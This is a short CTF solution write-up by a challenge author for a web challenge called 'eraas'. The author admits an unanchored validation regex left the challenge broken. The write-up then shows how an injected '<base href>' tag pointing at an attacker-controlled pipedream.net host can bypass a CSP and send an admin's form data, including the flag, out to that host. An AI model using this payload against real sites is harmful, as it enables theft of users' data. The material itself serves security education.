# eraas Solution

This challenge was broken. I came to know of it only after the CTF ended, while going through writeups.

At line 22 in "main.py", I forgot to include a trailing `$` in the validation regex that was supposed to ensure that the user input was numeric:

`REGEX_DIGITS = re.compile("^\d+")`

should have been

`REGEX_DIGITS = re.compile("^\d+$")`

Moral: Test your challenges else they will be for nothing.

---

The "email" field at `/status` seems to be un-sanitized but it can't be used for XSS due to the CSP blocking all external connections. We need to find something else to bypass this CSP.

After going through the JS, we find that the presence of a "?token" query in the URL returns a form in addition to the data fields. It's possibly used by the admin to manually type in the decoded epoch; flag in our case.

The above mentioned form submits to the relative URL `.`, i.e. the current page. Hence, it can be made to submit data to an attacker controlled domain by setting the [`base` URL](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base) via the "email" field. Example payload:

```
<base href="https://abcde.pipedream.net">
```

Note: Only the scheme and hostname is taken into consideration while setting the `base` URL; path, query, etc are ignored.

[solve.py](solve.py)
